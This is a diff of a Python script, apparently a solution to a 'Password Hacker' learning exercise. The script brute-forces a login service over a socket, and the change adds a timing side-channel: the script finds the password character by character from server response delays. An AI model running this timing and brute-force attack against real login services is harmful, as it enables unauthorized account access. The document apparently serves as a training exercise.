@@ -1,5 +1,6 @@
 # write your code here
 import sys, socket, itertools, os, json
+from datetime import datetime, timedelta
 
 # stage 1
 # def iterGen():
@@ -12,10 +13,12 @@ import sys, socket, itertools, os, json
 
 def testAuth(soc, l, p=""):
     data = json.dumps({"login": l, "password": p})
+    start = datetime.now()
     soc.send(data.encode())
     response = soc.recv(1024)
+    diff = datetime.now() - start
     response = json.loads(response.decode()).get("result")
-    return data, response
+    return data, response, diff
 
 # path = os.getcwd()
 path = "D:\\Dropbox\\programming\\Home\\Password Hacker\\Password Hacker\\task\\hacking"
@@ -30,8 +33,10 @@ if __name__ == "__main__":
         with open(path + '\\logins.txt', 'r') as db:
             logins = db.read().splitlines()
 
+        difference = timedelta()
         for login in logins:
-            data, resp = testAuth(client_socket, login)
+            data, resp, time = testAuth(client_socket, login)
+            difference = max(difference, time)
             if resp != "Wrong login!":
                 break
 
@@ -43,8 +48,9 @@ if __name__ == "__main__":
 
         while response != "Connection success!":
             for i in cases:
-                data, response = testAuth(client_socket, login, psw + i)
-                if response in ["Exception happened during login", "Connection success!"]:
+                start = datetime.now()
+                data, response, time = testAuth(client_socket, login, psw + i)
+                if time > difference or response == "Connection success!":
                     psw += i
                     break
 
